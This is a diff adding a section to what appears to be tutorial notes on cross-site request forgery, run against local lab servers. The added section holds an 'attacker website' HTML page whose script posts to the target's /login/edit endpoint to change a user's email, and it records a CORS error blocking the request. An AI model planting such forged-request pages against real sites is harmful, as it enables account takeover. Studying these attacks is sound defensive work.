@@ -618,6 +618,7 @@ We are going to use
       ```bash
         # cd apps/target-server 
         npm pkg set scripts.dev="serve -l 5555 ./src/index.html"
+        npm pkg set scripts.dev:a="serve -l 5555 ./src/index_01.html"
       ```
 
   
@@ -743,3 +744,47 @@ We are going to use
         - targer-server
           - Login into targer-server
           - Invalid credentials message.
+
+  
+  - Second attack form
+
+    - Create an apps/attack-server/src/index.html file
+
+      ```html
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+          <meta charset="UTF-8">
+          <meta name="viewport" content="width=device-width, initial-scale=1.0">
+          <title>Attacker WebSite</title>
+        </head>
+        <body>
+          <div>
+            <h1>Some nice website</h1>
+          </div>
+          <script>
+            fetch("http://localhost:3333/login/edit", {
+              method: "POST",
+              body: {
+                email: "HACKED_sinqueteenteres@test.com"
+              }
+            })
+              .then(res => res.text())
+              .then(text => console.log(text))
+              .catch(err => console.log(err))
+          </script>
+        </body>
+        </html>
+      ```
+
+    - Test 01
+      - Try 01: How this attack occurs
+        - targer-server
+          - Run targer-server: [targer-server](http://localhost:3333/home)
+          - Login into targer-server
+        - attack-server
+          - Run targer-server: [attack-server](http://localhost:5555)
+          - An error message is displayed in browser: 
+            - Access to fetch at **'http://localhost:3333/login/edit'** from origin **'http://localhost:5555'** has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource. If an opaque response serves your needs, set the request's mode to 'no-cors' to fetch the resource with CORS disabled.
+              - This disable target server to send message about email changed.
+              - We had not sent credential
